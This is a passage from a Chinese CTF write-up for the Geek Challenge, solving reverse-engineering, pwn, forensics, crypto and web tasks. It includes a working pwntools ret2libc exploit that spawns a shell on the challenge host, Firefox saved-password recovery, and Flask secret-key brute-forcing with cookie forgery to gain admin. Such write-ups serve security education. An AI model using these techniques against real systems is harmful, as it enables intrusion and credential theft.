BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+10Ch] [rbp+8Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_14000181E(argc, argv, envp);</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;GEEK&quot;</span>);</span><br><span class="line">  sub_1400013B4(<span class="string">&quot;WOW~~Niceeeee to see you here!!!\n&quot;</span>);</span><br><span class="line">  sub_1400013B4(<span class="string">&quot;Welcome to GEEK Challenge!!!!!\n&quot;</span>);</span><br><span class="line">  sub_1400013B4(<span class="string">&quot;Please input your answer~\n&quot;</span>);</span><br><span class="line">  sub_140001360(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  sub_14000144B(Str, <span class="number">20</span>i64);</span><br><span class="line">  sub_140001596(Str, v4);</span><br><span class="line">  sub_14000161C(Str, &amp;v4[<span class="number">5</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v4[<span class="number">5</span>], <span class="string">&quot;0A161230300C2D0A2B303D2428233005242C2D26182206233E097F133A&quot;</span>) )</span><br><span class="line">    sub_1400013B4(<span class="string">&quot;G00D!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_1400013B4(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  sub_1400013B4(<span class="string">&quot;\nPress any key to continue...&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析加密逻辑为 ROT20+异或GEEK，解密逻辑：异或GEEK+ROT6，得到flag：<code>SYC&#123;cOnGraduulaTions_mIneR:D&#125;</code>。</p><p>​</p><h3 id="CPP-flower"><a href="#CPP-flower" class="headerlink" title="CPP_flower"></a>CPP_flower</h3><blockquote><p>栀子花开啊开~</p></blockquote><p>nop掉几种花指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. jz xxx; jnz xxx</span><br><span class="line">2. call near ptr xxx</span><br><span class="line">3. jump</span><br><span class="line">4. push xxx retn</span><br></pre></td></tr></table></figure><p>大概还原出这样的伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_559D10</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [esp-8h] [ebp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">41</span>]; <span class="comment">// [esp+2Ch] [ebp-208h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+104h] [ebp-130h]</span></span><br><span class="line">  <span class="type">int</span> Buf2[<span class="number">52</span>]; <span class="comment">// [esp+110h] [ebp-124h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1E0h] [ebp-54h]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">36</span>]; <span class="comment">// [esp+1ECh] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">20</span>]; <span class="comment">// [esp+210h] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+230h] [ebp-4h]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+234h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_551127(<span class="number">0x10</span>u);</span><br><span class="line">  sub_5511C2(v11);</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  srand(<span class="number">0x7DE9</span>u);</span><br><span class="line">  sub_551519();</span><br><span class="line">  sub_5514B0(v10);</span><br><span class="line">  LOBYTE(v12) = <span class="number">1</span>;</span><br><span class="line">  v0 = sub_55138E(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;give your input:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, sub_551073);</span><br><span class="line">  sub_551519();</span><br><span class="line">  sub_5513F7(<span class="built_in">std</span>::<span class="built_in">cin</span>, v10);</span><br><span class="line">  <span class="keyword">if</span> ( sub_55181B(v10) == dword_566004 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_566004; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      rand();</span><br><span class="line">      v6[<span class="number">0</span>] = sub_551519() % <span class="number">255</span>;</span><br><span class="line">      sub_5512E4(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_566004; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_55128A(i);</span><br><span class="line">      v7 = *v2 ^ *sub_551113(i);</span><br><span class="line">      Buf2[i] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !j_memcmp(&amp;unk_562C30, Buf2, <span class="number">4</span> * dword_566004) )</span><br><span class="line">      v3 = sub_55138E(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;you get it&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = sub_55138E(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, sub_551073);</span><br><span class="line">    sub_551519();</span><br><span class="line">    LOBYTE(v12) = <span class="number">0</span>;</span><br><span class="line">    sub_551438(v10);</span><br><span class="line">    v12 = <span class="number">-1</span>;</span><br><span class="line">    sub_551726(v11);</span><br><span class="line">    LODWORD(v1) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    LOBYTE(v12) = <span class="number">0</span>;</span><br><span class="line">    sub_551438(v10);</span><br><span class="line">    v12 = <span class="number">-1</span>;</span><br><span class="line">    sub_551726(v11);</span><br><span class="line">    LODWORD(v1) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = v1;</span><br><span class="line">  sub_551456(&amp;savedregs, &amp;loc_55A008);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑为：先 <code>srand(0x7DE9)</code>，再将输入的每个字符异或 <code>rand()%255</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> c[<span class="number">50</span>]=&#123;<span class="number">62</span>, <span class="number">152</span>, <span class="number">235</span>, <span class="number">38</span>, <span class="number">37</span>, <span class="number">142</span>, <span class="number">37</span>, <span class="number">229</span>, <span class="number">134</span>, <span class="number">200</span>, <span class="number">63</span>, <span class="number">152</span>, <span class="number">200</span>, <span class="number">222</span>, <span class="number">82</span>, <span class="number">68</span>, <span class="number">160</span>, <span class="number">203</span>, <span class="number">43</span>, <span class="number">42</span>, <span class="number">60</span>, <span class="number">170</span>, <span class="number">190</span>, <span class="number">203</span>, <span class="number">136</span>, <span class="number">85</span>, <span class="number">158</span>, <span class="number">109</span>, <span class="number">217</span>, <span class="number">148</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">82</span>, <span class="number">49</span>, <span class="number">89</span>, <span class="number">254</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">232</span>, <span class="number">208</span>, <span class="number">58</span>, <span class="number">156</span>, <span class="number">6</span>, <span class="number">94</span>, <span class="number">37</span>, <span class="number">90</span>, <span class="number">228</span>, <span class="number">34</span>, <span class="number">161</span>, <span class="number">197</span>&#125;;</span><br><span class="line">    srand(<span class="number">0x7DE9</span>u);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">50</span>;++i)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(rand()%<span class="number">255</span>)^c[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SYC&#123;Y0u_c@n_3nJoy_yhe_Flow3r_anytime_and_anywhere&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="su"><a href="#su" class="headerlink" title="su~~~~"></a>su~~~~</h3><blockquote><p>C罗？su~~~~</p></blockquote><p>直接用ret2libc可解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">27612</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;su_____/csu&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;su_____/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt.puts</span><br><span class="line">puts_got=elf.got.puts</span><br><span class="line">pop_rdi=<span class="number">0x400903</span></span><br><span class="line">ret=<span class="number">0x4005d6</span></span><br><span class="line">back=elf.sym.writesomething</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;exit.\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pl=flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>),pop_rdi,puts_got,puts_plt,back])</span><br><span class="line">r.send(pl)</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;puts_addr:x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.sym.puts</span><br><span class="line">success(<span class="string">f&#x27;<span class="subst">&#123;libc_base:x&#125;</span>&#x27;</span>)</span><br><span class="line">system=libc_base+libc.sym.system</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pl=flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>),ret,pop_rdi,binsh,system,back])</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><blockquote><p>听说爱冒险的lhRaMk7师傅最近换了个浏览器，似乎藏了一些有用的东西…</p><p>下载链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1p_90wi798gG7wuREGQkhvw?pwd=game">https://pan.baidu.com/s/1p_90wi798gG7wuREGQkhvw?pwd=game</a> 提取码: game</p></blockquote><p><code>Geek2024.ad1</code> 文件，文件头为 <code>ADSEGMENTEDFILE</code>，查为AccessData逻辑镜像文件，使用AccessData FTK Imager打开。</p><p>提示浏览器，<code>Public/Desktop</code> 目录下有Firefox和Edge的快捷方式，<code>Geek2024/Document</code> 目录下有 <code>Adventure.txt</code>。</p><p>base64隐写得到：<code>100011111001011100101110101101100100110000011001001101001010011111100111000110100000</code>，7bits转字符：<code>Geek2024Syc</code>。</p><p>寻找火狐浏览器相关文件，在 <code>Geek2024/AppData/Roaming/Mozilla/Firefox/Profiles/uf11qmty.default</code> 中，尝试用firepwd工具还原：<br><code>python firepwd.py -p Geek2024Syc -d uf11qmty.default</code></p><p>无有效信息，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_74292969/article/details/136544419">[GKCTF 2021]FireFox Forensics1 关于 Firefox的网站密码存储</a></p><p>下载安装火狐浏览器，新建密码，Win+R，输入 <code>%AppData%\Mozilla\Firefox\Profiles</code>，进入第一个文件夹，替换取出的 <code>key4.db</code> 和 <code>logins.json</code>，重新打开火狐浏览器，进入密码界面，输入主密码 <code>Geek2024Syc</code>，显示密码，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网址</span><br><span class="line">http://geek2024.welc0me.you</span><br><span class="line">用户名</span><br><span class="line">Geek2024</span><br><span class="line">密码</span><br><span class="line">SYC&#123;F1ref0x_F0r3ns1cs_Mas7er&#125;</span><br></pre></td></tr></table></figure><p>​</p><h2 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ecc"><a href="#ecc" class="headerlink" title="ecc"></a>ecc</h3><blockquote><p>椭圆曲线加密，flag前缀为SYC{xx}</p></blockquote><p>$M=C_1-kC_2$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">p = <span class="number">93202687891394085633786409619308940289806301885603002539703165565954917915237</span></span><br><span class="line">a = <span class="number">93822086754590882682502837744000915992590989006575416134628106376590825652793</span></span><br><span class="line">b = <span class="number">80546187587527518012258369984400999843218609481640396827119274116524742672463</span></span><br><span class="line">F = GF(p)</span><br><span class="line">E = EllipticCurve(F,[a,b])</span><br><span class="line"></span><br><span class="line">k = <span class="number">58946963503925758614502522844777257459612909354227999110879446485128547020161</span></span><br><span class="line">c1 = E(<span class="number">40485287784577105052142632380297282223290388901294496494726004092953216846111</span>, <span class="number">81688798450940847410572480357702533480504451191937977779652402489509511335169</span>)</span><br><span class="line">c2 = E(<span class="number">51588540344302003527882762117190244240363885481651104291377049503085003152858</span>, <span class="number">77333747801859674540077067783932976850711668089918703995609977466893496793359</span>)</span><br><span class="line">cipher_left = <span class="number">34210996654599605871773958201517275601830496965429751344560373676881990711573</span></span><br><span class="line">cipher_right = <span class="number">62166121351090454316858010748966403510891793374784456622783974987056684617905</span></span><br><span class="line"></span><br><span class="line">m = (c1-k*c2).xy()</span><br><span class="line">m1 = F(cipher_left)/m[<span class="number">0</span>]</span><br><span class="line">m2 = F(cipher_right)/m[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:])+<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m2)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;Ecc$is!sO@HaRd&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><blockquote><p>coppersmith，flag前缀为SYC{xx}</p></blockquote><p>已知m高位，coppersmith求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511</span></span><br><span class="line">c = <span class="number">9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965</span></span><br><span class="line">h = <span class="number">111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">mh=(h+<span class="number">2023</span>)*inverse_mod(<span class="number">2024</span>,n)%n</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mh + x)^e - c</span><br><span class="line">root=f.small_roots(X=<span class="number">2</span>^<span class="number">150</span>, beta=<span class="number">1</span>)</span><br><span class="line">m = mh+root[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;crypto_is_very_interesting_why_dont_you_join_us&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="RnoCRT"><a href="#RnoCRT" class="headerlink" title="RnoCRT"></a>RnoCRT</h3><blockquote><p>Also gcd!=1</p></blockquote><p>crt+sha256爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m=[<span class="number">207867980504656835313307696396607264603</span>, <span class="number">245036212212570610987366430554968489325</span>, <span class="number">270836744824069537438646110613439698666</span>, <span class="number">319275775495422875474878625752594133023</span>, <span class="number">254268823435329877199449670714528712873</span>, <span class="number">213093607196415232366564484229844568444</span>, <span class="number">246921085368773491003187313772615702950</span>]</span><br><span class="line">c=[<span class="number">150031581047390726903711035932621949276</span>, <span class="number">21260202376534810598778595491323328519</span>, <span class="number">144049733622518360270048059408969512643</span>, <span class="number">236920143187836025924037873968303507493</span>, <span class="number">99781504248790469459151935530031893836</span>, <span class="number">69236016568483424294966410179787943383</span>, <span class="number">20613188366058016717435734248097940419</span>]</span><br><span class="line">x=crt(c,m)</span><br><span class="line"></span><br><span class="line">l=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    l=lcm(l,m[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    y=x+k*l</span><br><span class="line">    h1=hashlib.sha256(<span class="built_in">str</span>(y).encode()).hexdigest()</span><br><span class="line">    h2=hashlib.sha256(long_to_bytes(y)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> h1[:<span class="number">5</span>]==<span class="string">&#x27;6a651&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;case 1&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;SYC&#123;&#123;<span class="subst">&#123;h1&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> h2[:<span class="number">5</span>]==<span class="string">&#x27;6a651&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;case 2&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;SYC&#123;&#123;<span class="subst">&#123;h2&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line"><span class="comment">#case 1</span></span><br><span class="line"><span class="comment">#3804</span></span><br><span class="line"><span class="comment">#SYC&#123;6a651b7ce47b35cc1aca565028fb633fab9e35ca08e45d5ce987a6caeb500465&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="LLL"><a href="#LLL" class="headerlink" title="LLL"></a>LLL</h3><blockquote><p>基础LLL，flag前缀为SYC{xx}</p></blockquote><p>构造格，加大系数 $K=2^{176}$ 配平：</p><p>$(m,-1,k)\begin{bmatrix} 1 &amp; 0 &amp; a \newline 0 &amp; K &amp; b \newline 0 &amp; 0 &amp; p \end{bmatrix}=(m,-K,-c)$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = <span class="number">169790849804323540946197204708402762862586197604183102589270741859708550301920348112941305999764092197996929298474590062625556806793613268527763774013772685954699561684244945434843656515307801882995934869499880288594142919381501796488815033294127591623260894764750214588993456840404443515671353802614450411717</span></span><br><span class="line">b = <span class="number">87985708831523238980948938165414984318379459926002798504435964538203443877988599888615810231215118828138306895572062833107988965151522391460216837691927960249874511818878134399363147008042562222910234739940697553852540265617603482995091203105040187460485673579382171260197291783748886765929376179151804062085</span></span><br><span class="line">p = <span class="number">131724494512065658801039766546788821718063963144467818735768040631367069153816254855229655449559099188694403260044990366292026916085340250077198735215774149087025577263769846650728593180101073940507285459917860726551385227481715873503612683249433020201729190862430476054822102865441136763977415824331858801617</span></span><br><span class="line"></span><br><span class="line">K = <span class="number">2</span>^<span class="number">176</span></span><br><span class="line">M = matrix(ZZ,[[<span class="number">1</span>,<span class="number">0</span>,a],[<span class="number">0</span>,K,b],[<span class="number">0</span>,<span class="number">0</span>,p]])</span><br><span class="line">L = M.LLL()</span><br><span class="line"><span class="built_in">print</span>(L)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">abs</span>(L[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;1e989433efffd767589e989ad0f091075c06&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="py-game"><a href="#py-game" class="headerlink" title="py_game"></a>py_game</h3><blockquote><p>学习累了就来玩玩游戏休息一下吧</p><p>通关真的会给flag吗?</p></blockquote><p>注册，拿到cookie，用flask-unsign爆破flask key：</p><p><code>flask-unsign --unsign --cookie &#39;eyJ1c2VybmFtZSI6ImFhYSJ9.ZyUUjg.WtjPt0cu-uBZcQP4mlALEs-LrWM&#39; --wordlist rockyou.txt --no-literal-eval</code></p><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Session decodes to: &#123;&#x27;username&#x27;: &#x27;aaa&#x27;&#125;</span><br><span class="line">[*] Starting brute-forcer with 8 threads..</span><br><span class="line">[+] Found secret key after 768 attempts</span><br><span class="line">b&#x27;a123456&#x27;</span><br></pre></td></tr></table></figure><p>伪造admin：</p><p><code>flask-unsign --sign --cookie &quot;&#123;&#39;username&#39;: &#39;admin&#39;&#125;&quot; --secret a123456</code></p><p>替换cookie，以admin进入 <code>/admin</code> 路由，下载 <code>app.pyc</code>，反编译：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 